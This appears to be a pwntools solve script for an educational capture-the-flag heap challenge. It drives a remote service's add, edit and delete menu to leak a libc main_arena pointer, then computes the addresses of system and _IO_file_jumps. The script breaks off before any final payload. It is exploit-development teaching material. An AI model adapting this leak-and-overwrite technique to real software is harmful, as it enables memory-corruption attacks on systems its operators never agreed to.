# miniums/solve.py
from pwn import *

context.arch = 'amd64'
#context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10011)

def add_user(index, name):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(index).encode())
    r.sendlineafter(b'username\n> ', name)

def edit_data(index, size, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'index\n> ', str(index).encode())
    r.sendlineafter(b'size\n> ', str(size).encode())
    r.sendline(data)

def del_user(index):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'index\n> ', str(index).encode())

add_user(0, b'0')
edit_data(0, 0x1, b'a')

add_user(1, b'1')
del_user(0)

add_user(2, b'2')
edit_data(2, 0x1, b'b')

add_user(3, b'')
edit_data(3, 0x1, b'c')

r.sendlineafter(b'> ', b'4')
r.recvuntil(b'[3] \n')
addr = bytearray(r.recvline())
addr.pop()
main_arena_1418 = u64((b'\n' + addr).ljust(8, b'\x00'))
print(hex(main_arena_1418))
system = main_arena_1418 - 0x19ae7a
print(hex(system))
_IO_file_jumps = main_arena_1418 - 0x3c6a
print(hex(_IO_file_jumps))